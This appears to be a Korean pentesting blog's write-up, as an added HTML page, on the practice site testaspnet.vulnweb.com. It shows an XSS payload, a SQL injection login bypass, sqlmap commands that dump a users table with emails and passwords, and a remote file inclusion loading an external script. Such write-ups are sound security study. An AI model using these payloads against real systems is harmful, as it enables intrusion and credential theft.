@@ -1,0 +1,812 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>[ VulnWebs ] - testaspnet.vulnweb.com - A1mH1gh</title>
+<meta name="description" content="RECON OS: Windows Server WAS: IIS/8.5 Lang: ASP.NET     Information Leakage 서버 내 미존재 페이지에 접속할 경우 에러페이지가 반환되며 서버 정보관련 정보를 노출하고 있음 http://testaspnet.vulnweb.com/test    XSS 답글을 등록하는 페이지에서 http://testaspnet.vulnweb.com/Comments.aspx  스크립트를 삽입하면 &lt;script&gt;alert(document.domain)&lt;/script&gt;    스크립트가 실행됨   SQLi SQLi-1 로그인 페이지에서 http://testaspnet.vulnweb.com/login.aspx  아래 SQLi 문구를 입력해주면 &#39; or &#39;1&#39;=&#39;1&#39;--     Admin으로 로그인됨 로그인 시 조회하는 Tables에 첫 컬럼이 admin으로 저장되어 있기에 가능함   SQLi-2 DB를 조회하는 페이지를 확인 http://testaspnet.vulnweb.com/ReadNews.aspx?id=0  DB명 확인 λ python sqlmap.py -u &quot;http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&quot; -dbs         ___        __H__  ___ ___[(]_____ ___ ___  {1.6.3.19#dev} |_ -| . [,]     | .&#39;| . | |___|_  [)]_|_|_|__,|  _|       |_|V...       |_|   https://sqlmap.org --- Parameter: id (GET)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause     Payload: id=0 AND 8054=8054      Type: stacked queries     Title: Microsoft SQL Server/Sybase stacked queries (comment)     Payload: id=0;WAITFOR DELAY &#39;0:0:5&#39;--      Type: time-based blind     Title: Microsoft SQL Server/Sybase time-based blind (IF)     Payload: id=0 WAITFOR DELAY &#39;0:0:5&#39; --- available databases [6]: [*] acuforum [*] acuservice [*] master [*] model [*] msdb [*] tempdb  Table 확인 python sqlmap.py -u &quot;http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&quot; -D acuforum -tables Database: acuforum [4 tables] +---------+ | forums  | | posts   | | threads | | users   | +---------+   Columns 확인  python sqlmap.py -u &quot;http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&quot; -D acuforum -T users -dump  Database: acuforum Table: users [8 entries] +-------------------------------------+--------------+-------------+---------+---------------------+ | email                               | uname        | upass       | avatar  | realname            | +-------------------------------------+--------------+-------------+---------+---------------------+ | admin@adminspace.com                | admin        | none        | &lt;blank&gt; | admin the allmighty | | olesya.zhukova.1994@bk.ru           | Emanuelhicup | 83sb9peQp$L | &lt;blank&gt; | Emanuelhicup        | | yana-sokolova-2023@list.ru          | Jameskaf     | 6vbgc&amp;2f4KE | &lt;blank&gt; | Jameskaf            | | smirnova.liudmila.1980.30.1@mail.ru | JeraldFoulk  | xzj@3Kyt14A | &lt;blank&gt; | JeraldFoulk         | | yourmail@gmail.com                  | JustinBoody  | %z9cv57JooJ | &lt;blank&gt; | JustinBoody         | | iurkova.nataliia.1981.11.6@inbox.ru | JustinWeite  | 57etus&amp;tZ1X | &lt;blank&gt; | JustinWeite         | | lala                                | rawbite      | none        | &lt;blank&gt; | lala                | | tinabr5@ho                          | &lt;blank&gt;      | &lt;blank&gt;     | &lt;blank&gt; | &lt;blank&gt;             | +-------------------------------------+--------------+-------------+---------+---------------------+  ID: admin PW: none   Cleartext Transmission 로그인 페이지에서 http://testaspnet.vulnweb.com/login.aspx  평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음)   Insufficient Session Expiration ‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음 로그인 직후 모습    1시간 경과 모습   ETC Remote File Inclusion 자동진단 툴 실행 결과 ‘외부 스크립트’ 파일을 참조하는 페이지가 존재함 https://testaspnet.vulnweb.com/ReadNews.aspx?id=0&amp;NewsAd=1234  공격자의 스크립트 파일을 불러와 페이지를 구성하여 반환함 &amp;NewsAd=http://xss.rocks/xss.js     Automated Attack 댓글을 등록하는 페이지에서 http://testaspnet.vulnweb.com/Comments.aspx?id=3  ‘댓글 달기’ 요청 패킷을 동시에 11건 발송을 시도   초당 사용자 요청 횟수를 제한하지 않아 모든 요청패킷이 처리되었고제한되지 않은 요청처리로 인해 서버 Dos가 공격자에 의해 수행될수있음     Done.">
+
+
+  <meta name="author" content="A1mH1gh">
+  
+  <meta property="article:author" content="A1mH1gh">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="A1mH1gh">
+<meta property="og:title" content="[ VulnWebs ] - testaspnet.vulnweb.com">
+<meta property="og:url" content="http://localhost:4000/vulnwebs_writeup/VulnWebs-testaspnet.vulnweb.com/">
+
+
+  <meta property="og:description" content="RECON OS: Windows Server WAS: IIS/8.5 Lang: ASP.NET     Information Leakage 서버 내 미존재 페이지에 접속할 경우 에러페이지가 반환되며 서버 정보관련 정보를 노출하고 있음 http://testaspnet.vulnweb.com/test    XSS 답글을 등록하는 페이지에서 http://testaspnet.vulnweb.com/Comments.aspx  스크립트를 삽입하면 &lt;script&gt;alert(document.domain)&lt;/script&gt;    스크립트가 실행됨   SQLi SQLi-1 로그인 페이지에서 http://testaspnet.vulnweb.com/login.aspx  아래 SQLi 문구를 입력해주면 &#39; or &#39;1&#39;=&#39;1&#39;--     Admin으로 로그인됨 로그인 시 조회하는 Tables에 첫 컬럼이 admin으로 저장되어 있기에 가능함   SQLi-2 DB를 조회하는 페이지를 확인 http://testaspnet.vulnweb.com/ReadNews.aspx?id=0  DB명 확인 λ python sqlmap.py -u &quot;http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&quot; -dbs         ___        __H__  ___ ___[(]_____ ___ ___  {1.6.3.19#dev} |_ -| . [,]     | .&#39;| . | |___|_  [)]_|_|_|__,|  _|       |_|V...       |_|   https://sqlmap.org --- Parameter: id (GET)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause     Payload: id=0 AND 8054=8054      Type: stacked queries     Title: Microsoft SQL Server/Sybase stacked queries (comment)     Payload: id=0;WAITFOR DELAY &#39;0:0:5&#39;--      Type: time-based blind     Title: Microsoft SQL Server/Sybase time-based blind (IF)     Payload: id=0 WAITFOR DELAY &#39;0:0:5&#39; --- available databases [6]: [*] acuforum [*] acuservice [*] master [*] model [*] msdb [*] tempdb  Table 확인 python sqlmap.py -u &quot;http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&quot; -D acuforum -tables Database: acuforum [4 tables] +---------+ | forums  | | posts   | | threads | | users   | +---------+   Columns 확인  python sqlmap.py -u &quot;http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&quot; -D acuforum -T users -dump  Database: acuforum Table: users [8 entries] +-------------------------------------+--------------+-------------+---------+---------------------+ | email                               | uname        | upass       | avatar  | realname            | +-------------------------------------+--------------+-------------+---------+---------------------+ | admin@adminspace.com                | admin        | none        | &lt;blank&gt; | admin the allmighty | | olesya.zhukova.1994@bk.ru           | Emanuelhicup | 83sb9peQp$L | &lt;blank&gt; | Emanuelhicup        | | yana-sokolova-2023@list.ru          | Jameskaf     | 6vbgc&amp;2f4KE | &lt;blank&gt; | Jameskaf            | | smirnova.liudmila.1980.30.1@mail.ru | JeraldFoulk  | xzj@3Kyt14A | &lt;blank&gt; | JeraldFoulk         | | yourmail@gmail.com                  | JustinBoody  | %z9cv57JooJ | &lt;blank&gt; | JustinBoody         | | iurkova.nataliia.1981.11.6@inbox.ru | JustinWeite  | 57etus&amp;tZ1X | &lt;blank&gt; | JustinWeite         | | lala                                | rawbite      | none        | &lt;blank&gt; | lala                | | tinabr5@ho                          | &lt;blank&gt;      | &lt;blank&gt;     | &lt;blank&gt; | &lt;blank&gt;             | +-------------------------------------+--------------+-------------+---------+---------------------+  ID: admin PW: none   Cleartext Transmission 로그인 페이지에서 http://testaspnet.vulnweb.com/login.aspx  평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음)   Insufficient Session Expiration ‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음 로그인 직후 모습    1시간 경과 모습   ETC Remote File Inclusion 자동진단 툴 실행 결과 ‘외부 스크립트’ 파일을 참조하는 페이지가 존재함 https://testaspnet.vulnweb.com/ReadNews.aspx?id=0&amp;NewsAd=1234  공격자의 스크립트 파일을 불러와 페이지를 구성하여 반환함 &amp;NewsAd=http://xss.rocks/xss.js     Automated Attack 댓글을 등록하는 페이지에서 http://testaspnet.vulnweb.com/Comments.aspx?id=3  ‘댓글 달기’ 요청 패킷을 동시에 11건 발송을 시도   초당 사용자 요청 횟수를 제한하지 않아 모든 요청패킷이 처리되었고제한되지 않은 요청처리로 인해 서버 Dos가 공격자에 의해 수행될수있음     Done.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-12-03T00:00:00+09:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/vulnwebs_writeup/VulnWebs-testaspnet.vulnweb.com/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "A1mH1gh",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="A1mH1gh Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          A1mH1gh
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/HTB_Writeup/">HTB Writeup</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/VulnWebs_Writeup/">VulnWebs Writeup</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="http://localhost:4000/">
+        <img src="/assets/img/bow.png" alt="A1mH1gh" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">A1mH1gh</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Pentesting Log</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Republic of Korea</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:A1mH1gh4909@gmail.com" rel="me" class="u-email">
+            <meta itemprop="email" content="A1mH1gh4909@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="[ VulnWebs ] - testaspnet.vulnweb.com">
+    <meta itemprop="description" content="RECONOS: Windows ServerWAS: IIS/8.5Lang: ASP.NETInformation Leakage서버 내 미존재 페이지에 접속할 경우 에러페이지가 반환되며 서버 정보관련 정보를 노출하고 있음http://testaspnet.vulnweb.com/testXSS답글을 등록하는 페이지에서http://testaspnet.vulnweb.com/Comments.aspx스크립트를 삽입하면&lt;script&gt;alert(document.domain)&lt;/script&gt;스크립트가 실행됨SQLiSQLi-1로그인 페이지에서http://testaspnet.vulnweb.com/login.aspx아래 SQLi 문구를 입력해주면&#39; or &#39;1&#39;=&#39;1&#39;-- Admin으로 로그인됨로그인 시 조회하는 Tables에 첫 컬럼이 admin으로 저장되어 있기에 가능함SQLi-2DB를 조회하는 페이지를 확인http://testaspnet.vulnweb.com/ReadNews.aspx?id=0DB명 확인λ python sqlmap.py -u &quot;http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&quot; -dbs        ___       __H__ ___ ___[(]_____ ___ ___  {1.6.3.19#dev}|_ -| . [,]     | .&#39;| . ||___|_  [)]_|_|_|__,|  _|      |_|V...       |_|   https://sqlmap.org---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=0 AND 8054=8054    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: id=0;WAITFOR DELAY &#39;0:0:5&#39;--    Type: time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (IF)    Payload: id=0 WAITFOR DELAY &#39;0:0:5&#39;---available databases [6]:[*] acuforum[*] acuservice[*] master[*] model[*] msdb[*] tempdbTable 확인python sqlmap.py -u &quot;http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&quot; -D acuforum -tablesDatabase: acuforum[4 tables]+---------+| forums  || posts   || threads || users   |+---------+Columns 확인 python sqlmap.py -u &quot;http://testaspnet.vulnweb.com/ReadNews.aspx?id=0&quot; -D acuforum -T users -dump Database: acuforumTable: users[8 entries]+-------------------------------------+--------------+-------------+---------+---------------------+| email                               | uname        | upass       | avatar  | realname            |+-------------------------------------+--------------+-------------+---------+---------------------+| admin@adminspace.com                | admin        | none        | &lt;blank&gt; | admin the allmighty || olesya.zhukova.1994@bk.ru           | Emanuelhicup | 83sb9peQp$L | &lt;blank&gt; | Emanuelhicup        || yana-sokolova-2023@list.ru          | Jameskaf     | 6vbgc&amp;2f4KE | &lt;blank&gt; | Jameskaf            || smirnova.liudmila.1980.30.1@mail.ru | JeraldFoulk  | xzj@3Kyt14A | &lt;blank&gt; | JeraldFoulk         || yourmail@gmail.com                  | JustinBoody  | %z9cv57JooJ | &lt;blank&gt; | JustinBoody         || iurkova.nataliia.1981.11.6@inbox.ru | JustinWeite  | 57etus&amp;tZ1X | &lt;blank&gt; | JustinWeite         || lala                                | rawbite      | none        | &lt;blank&gt; | lala                || tinabr5@ho                          | &lt;blank&gt;      | &lt;blank&gt;     | &lt;blank&gt; | &lt;blank&gt;             |+-------------------------------------+--------------+-------------+---------+---------------------+ID: adminPW: noneCleartext Transmission로그인 페이지에서http://testaspnet.vulnweb.com/login.aspx평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음)Insufficient Session Expiration‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음로그인 직후 모습 1시간 경과 모습ETCRemote File Inclusion자동진단 툴 실행 결과 ‘외부 스크립트’ 파일을 참조하는 페이지가 존재함https://testaspnet.vulnweb.com/ReadNews.aspx?id=0&amp;NewsAd=1234공격자의 스크립트 파일을 불러와 페이지를 구성하여 반환함&amp;NewsAd=http://xss.rocks/xss.jsAutomated Attack댓글을 등록하는 페이지에서http://testaspnet.vulnweb.com/Comments.aspx?id=3‘댓글 달기’ 요청 패킷을 동시에 11건 발송을 시도초당 사용자 요청 횟수를 제한하지 않아 모든 요청패킷이 처리되었고제한되지 않은 요청처리로 인해 서버 Dos가 공격자에 의해 수행될수있음Done.">
+    <meta itemprop="datePublished" content="2022-12-03T00:00:00+09:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="http://localhost:4000/vulnwebs_writeup/VulnWebs-testaspnet.vulnweb.com/" class="u-url" itemprop="url">[ VulnWebs ] - testaspnet.vulnweb.com
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#recon">RECON</a></li><li><a href="#information-leakage">Information Leakage</a></li><li><a href="#xss">XSS</a></li><li><a href="#sqli">SQLi</a><ul><li><a href="#sqli-1">SQLi-1</a></li><li><a href="#sqli-2">SQLi-2</a></li></ul></li><li><a href="#cleartext-transmission">Cleartext Transmission</a></li><li><a href="#insufficient-session-expiration">Insufficient Session Expiration</a></li><li><a href="#etc">ETC</a><ul><li><a href="#remote-file-inclusion">Remote File Inclusion</a></li></ul></li><li><a href="#automated-attack">Automated Attack</a></li></ul>
+
+            </nav>
+          </aside>
+        
+        <p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205482508-0512491f-7087-441e-8ba6-bc7be53be8dc.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207843647-0a55e1df-2d7e-4283-bd8f-bdf765c3ebda.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS: Windows Server
+WAS: IIS/8.5
+Lang: ASP.NET
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205478205-315ba4c8-714d-4f1b-9730-c320ea5f27e2.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/205478263-20887909-d6dd-45e5-adb9-f0d1851c453c.png" alt="image" /></p>
+
+<h2 id="information-leakage">Information Leakage</h2>
+<p>서버 내 미존재 페이지에 접속할 경우 에러페이지가 반환되며 서버 정보관련 정보를 노출하고 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/test
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205478944-0e4ba386-61e5-4a33-a6b8-5e78fcdc7bfe.png" alt="image" /></p>
+
+<h2 id="xss">XSS</h2>
+<p>답글을 등록하는 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/Comments.aspx
+</code></pre></div></div>
+<p>스크립트를 삽입하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205478467-b666664b-2aa7-452a-b77f-8927b10ba841.png" alt="image" /></p>
+
+<p>스크립트가 실행됨
+<img src="https://user-images.githubusercontent.com/100695923/205478477-209e3e7a-2f2b-42e8-b3b0-d948aeb5b2bd.png" alt="image" /></p>
+
+<h2 id="sqli">SQLi</h2>
+<h3 id="sqli-1">SQLi-1</h3>
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/login.aspx
+</code></pre></div></div>
+<p>아래 SQLi 문구를 입력해주면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' or '1'='1'-- 
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207756474-a8f65c32-f109-4938-b96d-585c22a1ae05.png" alt="image" /></p>
+
+<p>Admin으로 로그인됨<br />
+로그인 시 조회하는 Tables에 첫 컬럼이 admin으로 저장되어 있기에 가능함
+<img src="https://user-images.githubusercontent.com/56434196/207756538-4481dadf-86a9-4172-8a92-f7b472ce4147.png" alt="image" /></p>
+
+<h3 id="sqli-2">SQLi-2</h3>
+<p>DB를 조회하는 페이지를 확인</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/ReadNews.aspx?id=0
+</code></pre></div></div>
+<p>DB명 확인</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ python sqlmap.py -u "http://testaspnet.vulnweb.com/ReadNews.aspx?id=0" -dbs
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.6.3.19#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=0 AND 8054=8054
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: id=0;WAITFOR DELAY '0:0:5'--
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (IF)
+    Payload: id=0 WAITFOR DELAY '0:0:5'
+---
+available databases [6]:
+[*] acuforum
+[*] acuservice
+[*] master
+[*] model
+[*] msdb
+[*] tempdb
+</code></pre></div></div>
+<p>Table 확인</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sqlmap.py -u "http://testaspnet.vulnweb.com/ReadNews.aspx?id=0" -D acuforum -tables
+Database: acuforum
+[4 tables]
++---------+
+| forums  |
+| posts   |
+| threads |
+| users   |
++---------+
+
+</code></pre></div></div>
+<p>Columns 확인</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python sqlmap.py -u "http://testaspnet.vulnweb.com/ReadNews.aspx?id=0" -D acuforum -T users -dump
+ Database: acuforum
+Table: users
+[8 entries]
++-------------------------------------+--------------+-------------+---------+---------------------+
+| email                               | uname        | upass       | avatar  | realname            |
++-------------------------------------+--------------+-------------+---------+---------------------+
+| admin@adminspace.com                | admin        | none        | &lt;blank&gt; | admin the allmighty |
+| olesya.zhukova.1994@bk.ru           | Emanuelhicup | 83sb9peQp$L | &lt;blank&gt; | Emanuelhicup        |
+| yana-sokolova-2023@list.ru          | Jameskaf     | 6vbgc&amp;2f4KE | &lt;blank&gt; | Jameskaf            |
+| smirnova.liudmila.1980.30.1@mail.ru | JeraldFoulk  | xzj@3Kyt14A | &lt;blank&gt; | JeraldFoulk         |
+| yourmail@gmail.com                  | JustinBoody  | %z9cv57JooJ | &lt;blank&gt; | JustinBoody         |
+| iurkova.nataliia.1981.11.6@inbox.ru | JustinWeite  | 57etus&amp;tZ1X | &lt;blank&gt; | JustinWeite         |
+| lala                                | rawbite      | none        | &lt;blank&gt; | lala                |
+| tinabr5@ho                          | &lt;blank&gt;      | &lt;blank&gt;     | &lt;blank&gt; | &lt;blank&gt;             |
++-------------------------------------+--------------+-------------+---------+---------------------+
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ID: admin
+PW: none
+</code></pre></div></div>
+
+<h2 id="cleartext-transmission">Cleartext Transmission</h2>
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/login.aspx
+</code></pre></div></div>
+<p>평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음<br />(인코딩 및 암호화되지 않음)
+<img src="https://user-images.githubusercontent.com/100695923/205484511-a2d2ee34-3f1b-4b1c-b8fb-191ff0db2518.png" alt="image" /></p>
+
+<h2 id="insufficient-session-expiration">Insufficient Session Expiration</h2>
+<p>‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음
+<br />로그인 직후 모습 
+<img src="https://user-images.githubusercontent.com/56434196/207785149-f465b33b-3edb-46ec-a3d3-805e81e3eaa8.png" alt="image" /></p>
+
+<p>1시간 경과 모습
+<img src="https://user-images.githubusercontent.com/56434196/207785176-ccb8fa8a-ecd9-4365-a076-ee5dba33e9fe.png" alt="image" /></p>
+
+<h2 id="etc">ETC</h2>
+<h3 id="remote-file-inclusion">Remote File Inclusion</h3>
+<p>자동진단 툴 실행 결과 ‘외부 스크립트’ 파일을 참조하는 페이지가 존재함</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://testaspnet.vulnweb.com/ReadNews.aspx?id=0&amp;NewsAd=1234
+</code></pre></div></div>
+<p>공격자의 스크립트 파일을 불러와 페이지를 구성하여 반환함</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;NewsAd=http://xss.rocks/xss.js
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207747053-41b77291-15ee-438b-abe9-f4ac8fe02254.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/56434196/207747474-40adf19d-fc89-4c07-9f1c-8f60ffde3fcd.png" alt="image" /></p>
+
+<h2 id="automated-attack">Automated Attack</h2>
+<p>댓글을 등록하는 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/Comments.aspx?id=3
+</code></pre></div></div>
+<p>‘댓글 달기’ 요청 패킷을 동시에 11건 발송을 시도
+<img src="https://user-images.githubusercontent.com/56434196/207757818-c1de318a-d873-4ead-9cb6-6250f706d2a9.png" alt="image" /></p>
+
+<p>초당 사용자 요청 횟수를 제한하지 않아 모든 요청패킷이 처리되었고<br />제한되지 않은 요청처리로 인해 서버 Dos가 공격자에 의해 수행될수있음
+<img src="https://user-images.githubusercontent.com/56434196/207757904-badbc3d4-0323-4ba3-8078-e59a3b8e373c.png" alt="image" />
+<br />
+<br />
+<br />
+Done.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#vulnwebs-writeup" class="page__taxonomy-item p-category" rel="tag">VulnWebs_Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2022-12-03T00:00:00+09:00">December 3, 2022</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=%5B+VulnWebs+%5D+-+testaspnet.vulnweb.com%20http%3A%2F%2Flocalhost%3A4000%2Fvulnwebs_writeup%2FVulnWebs-testaspnet.vulnweb.com%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fvulnwebs_writeup%2FVulnWebs-testaspnet.vulnweb.com%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fvulnwebs_writeup%2FVulnWebs-testaspnet.vulnweb.com%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
